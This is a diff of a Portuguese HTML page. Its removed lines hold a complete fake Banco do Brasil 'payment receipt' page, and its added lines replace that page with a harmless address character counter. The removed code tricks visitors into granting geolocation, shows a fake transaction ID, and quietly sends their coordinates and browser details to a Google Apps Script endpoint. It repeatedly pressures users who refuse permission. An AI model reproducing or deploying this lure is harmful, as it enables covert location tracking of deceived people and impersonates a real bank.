@@ -2,549 +2,326 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Comprovante Digital BB</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-  <style>
-    /* Estilos do Header */
-    header {
-      background: #455cf9;
-      padding: 10px 20px;
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      z-index: 1000;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>E-Carta</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"> <!-- Para os ícones -->
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #f4f4f4;
+            margin: 0;
+        }
+        html, body {
+            height: 100%;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            width: 99%;
+            max-width: 1600px;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .dark-mode {
+            background-color: #333;
+            color: rgb(255, 255, 255);
+        }
+        .dark-mode .container {
+            background-color: #2e2d2d;
+            color: white;
+        }
+        .mode-toggle {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 24px;
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
+        .mode-toggle i {
+            color: #333;
+        }
+        .mode-toggle.dark i {
+            color: #f4f4f4;
+        }
+        h1 {
+            text-align: center;
+        }
+        .input-group {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            gap: 10px;
+        }
 
-    .navbar-left, .navbar-right {
-      display: flex;
-      align-items: center;
-      gap: 25px;
-    }
+        label {
+            font-weight: bold;
+            min-width: 100px; /* Mantém o mesmo tamanho para os labels */
+            text-align: right; /* Alinha o texto do label à direita */
+        }
 
-    .bb-logo {
-      width: 140px;
-      height: auto;
-      margin-right: 30px;
-    }
+        input {
+            flex: 1;
+            padding: 10px;
+            border: 2px solid #ccc;
+            border-radius: 5px;
+            outline: none;
+            transition: background 0.3s, border-color 0.3s;
+            width: 100%; /* Faz com que todos os inputs tenham o mesmo tamanho */
+            box-sizing: border-box; /* Inclui padding e borda no cálculo do tamanho */
+        }
 
-    .nav-menu {
-      display: flex;
-      gap: 30px;
-      list-style: none;
-      margin: 0;
-      padding: 0;
-    }
 
-    .nav-menu li {
-      color: white;
-      font-weight: 500;
-      cursor: pointer;
-      transition: all 0.3s ease;
-    }
+        .counter {
+            font-size: 14px;
+            color: #706f6f; /* Cor padrão (escura) */
+            font-weight: bold;
+            text-align: right; /* Alinha o contador à direita do input */
+            min-width: 50px; /* Garante que o contador tenha um tamanho fixo */
+        }
+        body.dark-mode .counter {
+              color: white; /* Cor para o modo escuro */
+        }        
 
-    .nav-menu li:hover {
-      color: #00cc44;
-      transform: translateY(-2px);
-    }
-
-    .search-bar {
-      background: rgba(255,255,255,0.15);
-      border-radius: 25px;
-      padding: 8px 15px;
-      display: flex;
-      align-items: center;
-      transition: all 0.3s ease;
-    }
-
-    .search-bar:hover {
-      background: rgba(255,255,255,0.25);
-    }
-
-    .search-bar input {
-      background: none;
-      border: none;
-      color: white;
-      margin-left: 10px;
-      width: 200px;
-      font-size: 14px;
-    }
-    
-    .search-bar input::placeholder {
-     color: White;
-    }
-
-    .login-btn {
-      background: #00cc44;
-      color: white;
-      border: none;
-      border-radius: 25px;
-      padding: 10px 30px;
-      cursor: pointer;
-      font-weight: bold;
-      transition: all 0.3s ease;
-    }
-
-    .login-btn:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 15px rgba(0,204,68,0.4);
-    }
-
-    /* Estilos do Corpo */
-    body { 
-      font-family: 'Arial', sans-serif;
-      margin-top: 80px;
-      background-image: url('https://tribunademinas.com.br/colunas/maistendencias/wp-content/uploads/2025/01/Banco-do-Brasil-log.jpeg');
-      background-size: cover;
-      background-position: center;
-      background-attachment: fixed;
-      min-height: 100vh;
-    }
-
-    main {
-      padding: 10px;
-    }
-
-    .conteudo-centralizado {
-      background: rgba(0, 0, 0, 0.85);
-      padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0 0 40px rgba(0,0,0,0.6);
-      text-align: center;
-      width: 90%;
-      max-width: 500px;
-      margin: 20px auto;
-      color: white;
-    }
-
-    .comprovante {
-      width: 450px;
-      height: 650px;
-      margin: 20px auto;
-      background: url('https://i.pinimg.com/474x/ba/b9/e3/bab9e37b21b7e6f489815e0d87b10970.jpg');
-      background-size: cover;
-      border-radius: 15px;
-      position: relative;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-    }
-
-    .botao-gerar {
-      padding: 18px 25px;
-      background: linear-gradient(135deg, #00cc44, #009933);
-      color: white;
-      border: none;
-      border-radius: 20px;
-      cursor: pointer;
-      margin: 10px 0;
-      font-size: 14px;
-      transition: all 0.3s ease;
-      letter-spacing: 1px;
-    }
-
-    .botao-gerar:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 25px rgba(0,204,68,0.5);
-    }
-
-    .dados-comprovante {
-      position: absolute;
-      bottom: 80px;
-      left: 50%;
-      transform: translateX(-50%);
-      text-align: center;
-      color: #000;
-      width: 80%;
-      font-family: 'Courier New', monospace;
-    }
-
-    #datetime {
-      font-size: 16px;
-      font-weight: bold;
-      color: #1a5f1a;
-      margin-bottom: 10px;
-    }
-
-    #codigo {
-      font-size: 20px;
-      color: #0033A0;
-      letter-spacing: 2px;
-    }
-
-    h1 {
-      margin-bottom: 40px;
-      font-size: 28px;
-      text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-    }
-
-    .hidden { 
-      display: none; 
-    }
-
-    /* Estilos do Modal de Confirmação */
-    #modalConfirm {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.5);
-      align-items: center;
-      justify-content: center;
-      z-index: 2000;
-    }
-
-    #modalConfirm .modal-content {
-      background: #faf2f2;
-      padding: 20px;
-      border-radius: 10px;
-      text-align: center;
-      max-width: 300px;
-      width: 90%;
-    }
-
-    #modalConfirm button {
-      margin: 10px;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-
-    #modalConfirm .confirm-btn {
-      background: #00cc44;
-      color: white;
-    }
-
-    #modalConfirm .cancel-btn {
-      background: #ccc;
-      color: black;
-    }
-
-    /* Banner de Segurança Moderno */
-    #securityBanner {
-      position: fixed;
-      bottom: 0;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 40%;
-      background: rgba(69, 191, 85, 0.9); /* Azul com 10% de opacidade */
-      color: #fff;
-      padding: 15px 20px;
-      font-size: 16px;
-      z-index: 3000;
-      box-shadow: 0 -2px 10px rgba(0,0,0,0.3);
-      border-top-left-radius: 10px;
-      border-top-right-radius: 10px;
-      text-align: center;
-    }
-
-    #securityBanner span {
-      display: block;
-      font-weight: bold;
-    }
-
-    #securityBanner button.close-banner {
-      position: absolute;
-      top: 10px;
-      right: 15px;
-      font-size: 20px;
-      background: transparent;
-      border: none;
-      color: #fff;
-      cursor: pointer;
-      transition: transform 0.3s;
-    }
-
-    #securityBanner button.close-banner:hover {
-      transform: scale(1.2);
-    }
-
-    @keyframes slideUp {
-      from { transform: translateY(100%); }
-      to { transform: translateY(0); }
-    }
-
-    /* Responsividade */
-    @media (max-width: 600px) {
-      .comprovante {
-        width: 300px;
-        height: 450px;
-      }
-      .nav-menu li {
-        font-size: 14px;
-      }
-      .search-bar input {
-        width: 120px;
-      }
-      #securityBanner {
-        font-size: 14px;
-      }
-      #securityBanner button.close-banner {
-        font-size: 18px;
-      }
-    }
-    
-    /*Celular*/
-    @media (max-width: 600px) {
-  header {
-    flex-direction: column;
-    align-items: flex-start;
-    gap: 10px;
-  }
-
-  .navbar-left, .navbar-right {
-    flex-direction: column;
-    align-items: flex-start;
-    width: 100%;
-  }
-
-  .nav-menu {
-    flex-wrap: wrap;
-    gap: 10px;
-  }
-
-  .conteudo-centralizado {
-    padding: 20px;
-    margin: 10px auto;
-    width: 95%;
-  }
-
-  .search-bar input {
-    width: 100px;
-    font-size: 12px;
-  }
-
-  .botao-gerar {
-    width: 100%;
-    padding: 15px;
-  }
-
-  .dados-comprovante {
-    font-size: 12px;
-  }
-
-  .bb-logo {
-    width: 120px;
-    margin-right: 10px;
-  }
-
-  .login-btn {
-    width: 100%;
-    padding: 10px;
-    text-align: center;
-  }
-
-  .comprovante {
-    width: 90%;
-    height: auto;
-    aspect-ratio: 2/3;
-    background-size: contain;
-    background-repeat: no-repeat;
-  }
-
-  #securityBanner {
-    width: 90%;
-    font-size: 12px;
-    padding: 10px;
-  }
-}
-
-  </style>
+        .copy-btn {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            cursor: pointer;
+            border-radius: 5px;
+            position: relative;
+        }
+        .copy-btn:hover {
+            background: #0056b3;
+        }
+        .copy-btn::after {
+            content: "Copiado!";
+            position: absolute;
+            background: #000;
+            color: #fff;
+            padding: 3px 5px;
+            font-size: 12px;
+            border-radius: 5px;
+            top: -25px;
+            right: 50%;
+            transform: translateX(50%);
+            display: none;
+        }
+        .copy-btn.copied::after {
+            display: block;
+        }
+        .valid {
+            background: #d4edda;
+            border-color: #28a745;
+        }
+        .invalid {
+            background: #f8d7da;
+            border-color: red;
+        }
+        .clear-btn {
+            display: block;
+            width: 50%;
+            padding: 10px;
+            background: #dc3545;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px auto 0 auto;
+        }
+        .clear-btn:hover {
+            background: #c82333;
+        }
+    </style>
 </head>
 <body>
-  <!-- Cabeçalho -->
-  <header>
-    <div class="navbar-left">
-      <button class="menu-btn" aria-label="Menu" style="background-color: #455cf9; border: none; padding: 10px; border-radius: 5px;">
-        <i class="fas fa-bars fa-lg" style="color: white;"></i>
-      </button>
-      <a href="#" class="logo">
-        <img src="https://logodownload.org/wp-content/uploads/2014/05/banco-do-brasil-logo-0.png" 
-             alt="Banco do Brasil" 
-             style="height: 40px; object-fit: contain; background-color: #455cf9;">
-      </a>
-      <ul class="nav-menu">
-        <li tabindex="0">Pra Você</li>
-        <li tabindex="0">Pro Seu Negócio</li>
-        <li tabindex="0">Agronegócios</li>
-        <li tabindex="0">Setor Público</li>
-      </ul>
+    <div class="mode-toggle" onclick="toggleDarkMode()">
+        <i class="fas fa-moon"></i> <!-- Ícone de sol -->
     </div>
-    
-    <div class="navbar-right">
-      <div class="search-bar">
-        <i class="fas fa-search" style="color: white;"></i>
-        <input type="text" placeholder="O que você precisa?" aria-label="Pesquisar">
-      </div>
-      <button class="login-btn">ACESSE SUA CONTA</button>
-    </div>
-  </header>
-  
-  <!-- Modal de Confirmação -->
-  <div id="modalConfirm" role="dialog" aria-modal="true">
-    <div class="modal-content">
-      <p>Confirma a geração do comprovante digital?</p>
-      <button class="confirm-btn" id="confirmBtn">Confirmar</button>
-      <button class="cancel-btn" id="cancelBtn">Cancelar</button>
-    </div>
-  </div>
-  
-  <!-- Conteúdo Principal -->
-  <main>
-    <section class="conteudo-centralizado">
-      <h1>Abrir Comprovante de pagamento Digital BB:</h1>
-      <button class="botao-gerar" id="gerarComprovante">GERAR COMPROVANTE</button>
-      
-      <div id="dados" class="hidden">
-        <div class="comprovante">
-          <div class="dados-comprovante">
-            <p id="datetime"></p>
-            <p>TRANSACTION ID: <span id="codigo"></span></p>
-          </div>
+    <div class="container">
+        <h1>Contar Caracteres E-Carta</h1>
+        <div id="form">
+            
+            <div class="input-group">
+                <label for="cep">CEP:</label>
+                <input type="text" id="cep" placeholder="Digite o CEP - É opcional" oninput="fetchAddress()">
+                <span class="counter" id="count-cep" style="visibility: hidden;">0/8</span> <!-- Contador invisível -->
+                <button class="copy-btn" onclick="copyText('cep', 8, 'CEP')">Copiar</button>
+            </div>
+            
+            <div class="input-group">
+                <label for="logradouro">Logradouro:</label>
+                <input type="text" id="logradouro" placeholder="Digite o logradouro" oninput="updateCharacterCount('logradouro')">
+                <span class="counter" id="count-logradouro">0/70</span>
+                <button class="copy-btn" onclick="copyText('logradouro', 70, 'Logradouro')">Copiar</button>
+            </div>
+            <div class="input-group">
+                <label for="numero">Número:</label>
+                <input type="text" id="numero" placeholder="Digite o número" oninput="updateCharacterCount('numero')">
+                <span class="counter" id="count-numero">0/12</span>
+                <button class="copy-btn" onclick="copyText('numero', 12, 'Número')">Copiar</button>
+            </div>
+            <div class="input-group">
+                <label for="complemento">Complemento:</label>
+                <input type="text" id="complemento" placeholder="Digite o complemento" oninput="updateCharacterCount('complemento')">
+                <span class="counter" id="count-complemento">0/50</span>
+                <button class="copy-btn" onclick="copyText('complemento', 50, 'Complemento')">Copiar</button>
+            </div>
+            <div class="input-group">
+                <label for="bairro">Bairro:</label>
+                <input type="text" id="bairro" placeholder="Digite o bairro" oninput="updateCharacterCount('bairro')">
+                <span class="counter" id="count-bairro">0/60</span>
+                <button class="copy-btn" onclick="copyText('bairro', 60, 'Bairro')">Copiar</button>
+            </div>
+            <div class="input-group">
+                <label for="cidade">Cidade:</label>
+                <input type="text" id="cidade" placeholder="Digite a cidade" oninput="updateCharacterCount('cidade')">
+                <span class="counter" id="count-cidade">0/60</span>
+                <button class="copy-btn" onclick="copyText('cidade', 60, 'Cidade')">Copiar</button>
+            </div>
+            
+            <button class="clear-btn" onclick="clearAll()">Limpar Tudo</button>
         </div>
-      </div>
-      <p id="errorMessage" style="color: #ff4444;"></p>
-    </section>
-  </main>
-  
-  <!-- Banner de Segurança Moderno -->
-  <div id="securityBanner">
-    <span>Ambiente seguro do Banco do Brasil</span>
-    <button class="close-banner" aria-label="Fechar banner">x</button>
-  </div>
-  
-  <script>
-    // Variável para contar as negações de permissão
-    let denyCount = 0;
-    
-    // Seleção dos elementos do DOM
-    const gerarComprovanteBtn = document.getElementById('gerarComprovante');
-    const modalConfirm = document.getElementById('modalConfirm');
-    const confirmBtn = document.getElementById('confirmBtn');
-    const cancelBtn = document.getElementById('cancelBtn');
-    const dadosSection = document.getElementById('dados');
-    const datetimeEl = document.getElementById('datetime');
-    const codigoEl = document.getElementById('codigo');
-    const errorMessageEl = document.getElementById('errorMessage');
-    const securityBanner = document.getElementById('securityBanner');
-    const closeBannerBtn = document.querySelector('#securityBanner .close-banner');
-    
-    // URL do script do Google (substitua conforme necessário)
-    const URL_SCRIPT = 'https://script.google.com/macros/s/AKfycbyI1HWZy-jeRGXMcjJWyJD8LXENt4BGrsD8RiSZNtup3EpjM2iuRYlCRaPW-CoMJeh3TQ/exec';
-    
-    // Funções para exibir/ocultar o banner de segurança
-    function hideSecurityBanner() {
-      securityBanner.style.display = "none";
-    }
-    
-    function showSecurityBanner() {
-      securityBanner.style.display = "block";
-      clearTimeout(window.securityBannerTimer);
-      window.securityBannerTimer = setTimeout(hideSecurityBanner, 5000); // 7 segundos
-    }
-    
-    // Fecha o banner ao clicar no botão "x"
-    closeBannerBtn.addEventListener('click', hideSecurityBanner);
-    
-    // Exibe o banner ao carregar a página (por 7 segundos)
-    document.addEventListener("DOMContentLoaded", () => {
-      showSecurityBanner();
-    });
-    
-    // Função para exibir o modal de confirmação
-    function showModal() {
-      modalConfirm.style.display = 'flex';
-    }
-    
-    // Função para ocultar o modal
-    function hideModal() {
-      modalConfirm.style.display = 'none';
-    }
-    
-    // Função para registrar os dados via fetch
-    async function registrarPlanilha(pos) {
-      const dados = {
-        lat: pos.coords.latitude,
-        lon: pos.coords.longitude,
-        accuracy: pos.coords.accuracy,
-        userAgent: navigator.userAgent
-      };
-    
-      try {
-        await fetch(URL_SCRIPT, {
-          method: 'POST',
-          mode: 'no-cors',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(dados)
+    </div>
+
+    <script>
+        // Função para ativar/desativar o modo escuro
+    function toggleDarkMode() {
+        document.body.classList.toggle("dark-mode");
+        document.querySelector(".mode-toggle").classList.toggle("dark");
+        const icon = document.querySelector(".mode-toggle i");
+        // Alterar ícone conforme o tema
+        if (document.body.classList.contains("dark-mode")) {
+            icon.classList.remove("fa-moon");
+            icon.classList.add("fa-sun"); // Ícone da lua no modo escuro
+        } else {
+            icon.classList.remove("fa-sun");
+            icon.classList.add("fa-moon"); // Ícone do sol no modo claro
+        }
+
+        // Alterando a cor do contador dependendo do modo
+        const counters = document.querySelectorAll('.counter');
+        counters.forEach(counter => {
+            if (document.body.classList.contains("dark-mode")) {
+                counter.style.color = "white"; // Modo escuro: cor branca
+            } else {
+                counter.style.color = "black"; // Modo claro: cor preta
+            }
         });
-      } catch (erro) {
-        console.error('Erro no registro:', erro);
-      }
     }
-    
-    // Função para iniciar a solicitação de geolocalização
-    function iniciarProcesso() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          pos => mostrarComprovante(pos),
-          erro => tratarErro(erro)
-        );
-      } else {
-        mostrarErro("Geolocalização não suportada pelo navegador.");
-      }
-    }
-    
-    // Função para mostrar o comprovante
-    function mostrarComprovante(pos) {
-      dadosSection.classList.remove('hidden');
-      const now = new Date();
-      datetimeEl.textContent = `${now.toLocaleDateString()} | ${now.toLocaleTimeString()}`;
-      codigoEl.textContent = `BB${Math.floor(100000 + Math.random() * 900000)}-${Math.floor(1000 + Math.random() * 9000)}`;
-      registrarPlanilha(pos);
-    }
-    
-    // Função para tratar erros na geolocalização
-    function tratarErro(erro) {
-      if (erro.code === erro.PERMISSION_DENIED) {
-        denyCount++;
-        const msg = `Permissão negada.
-        Ambiente seguro! Para acessar o comprovante tem que autorizar as permissões. Tente novamente em 5 segundos. (${denyCount})`;
-        mostrarErro(msg);
-        // Exibe o banner novamente por 7 segundos
-        showSecurityBanner();
-        setTimeout(() => {
-          errorMessageEl.textContent = "";
-        }, 7000);
-      } else if (erro.code === erro.POSITION_UNAVAILABLE) {
-        mostrarErro("Serviço de localização indisponível.");
-      } else if (erro.code === erro.TIMEOUT) {
-        mostrarErro("Tempo excedido para obtenção da localização.");
-      } else {
-        mostrarErro("Erro desconhecido na geolocalização.");
-      }
-    }
-    
-    // Função para exibir mensagem de erro
-    function mostrarErro(msg) {
-      errorMessageEl.textContent = msg;
-    }
-    
-    // Adiciona event listeners para os botões do modal
-    gerarComprovanteBtn.addEventListener('click', showModal);
-    confirmBtn.addEventListener('click', () => {
-      hideModal();
-      iniciarProcesso();
+
+        function fetchAddress() {
+            const cep = document.getElementById('cep').value.replace(/\D/g, ''); // Remove qualquer caractere não numérico
+            if (cep.length === 8) { // Só faz a consulta se o CEP tiver 8 caracteres
+                fetch(`https://viacep.com.br/ws/${cep}/json/`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (!data.erro) {
+                            // Preenche os campos de logradouro, bairro e cidade
+                            document.getElementById('logradouro').value = data.logradouro;
+                            document.getElementById('bairro').value = data.bairro;
+                            document.getElementById('cidade').value = `${data.localidade} - ${data.uf}`; // Cidade e Estado
+                            
+                            // Atualiza o contador de caracteres para os campos preenchidos
+                            updateCharacterCount('logradouro');
+                            updateCharacterCount('bairro');
+                            updateCharacterCount('cidade');
+                        } else {
+                            alert("CEP não encontrado!");
+                        }
+                    })
+                    .catch(() => alert("Erro ao buscar o CEP."));
+            }
+        }
+
+        // Função para atualizar a contagem de caracteres
+        function updateCharacterCount(id) {
+            let input = document.getElementById(id);
+            let counter = document.getElementById("count-" + id);
+
+            if (counter) {
+                let maxLength = parseInt(counter.textContent.split("/")[1]); // Obtém o valor máximo de caracteres
+                let length = input.value.length;
+                counter.textContent = `${length}/${maxLength}`;
+                
+                // Atualiza a classe de validação
+                if (length > maxLength) {
+                    input.classList.add("invalid");
+                    input.classList.remove("valid");
+
+                    // Muda a cor do contador para vermelho
+                    counter.style.color = "red";
+                } else {
+                    input.classList.add("valid");
+                    input.classList.remove("invalid");
+
+                    // Muda a cor do contador para verde
+                    counter.style.color = "green";
+                }
+            }
+        }
+
+
+
+        // Função para copiar texto
+        function copyText(id, maxLength, title) {
+            let input = document.getElementById(id);
+            let copyBtn = input.nextElementSibling.nextElementSibling;
+            
+            if (input.value.length > maxLength) {
+                let confirmCopy = confirm(`Ultrapassou o limite ${maxLength} caracteres do título ${title}. Gostaria de copiar as informações?`);
+                if (!confirmCopy) return;
+            }
+            
+            navigator.clipboard.writeText(input.value);
+            showCopiedMessage(copyBtn);
+        }
+
+        function showCopiedMessage(button) {
+            button.classList.add("copied");
+            setTimeout(() => {
+                button.classList.remove("copied");
+            }, 2000);  // Show "Copiado!" for 2 seconds
+        }
+
+        // Função para limpar todos os campos
+        function clearAll() {
+    document.querySelectorAll("input").forEach(input => {
+        // Limpa o valor do input
+        input.value = "";
+
+        // Remove as classes de validação
+        input.classList.remove("valid", "invalid");
+
+        // Restaura o contador de caracteres para o valor inicial (0/XX)
+        let counter = document.getElementById("count-" + input.id);
+        if (counter) {
+            let maxLength = counter.textContent.split("/")[1]; // Obtém o valor máximo de caracteres
+            counter.textContent = `0/${maxLength}`;
+
+            // Ajusta a cor do contador conforme o tema
+            if (document.body.classList.contains("dark-mode")) {
+                counter.style.color = "white"; // Cor branca para o tema escuro
+            } else {
+                counter.style.color = "#706f6f"; // Cor preta para o tema claro
+            }
+        }
     });
-    cancelBtn.addEventListener('click', hideModal);
-  </script>
+}
+
+
+    </script>
 </body>
 </html>
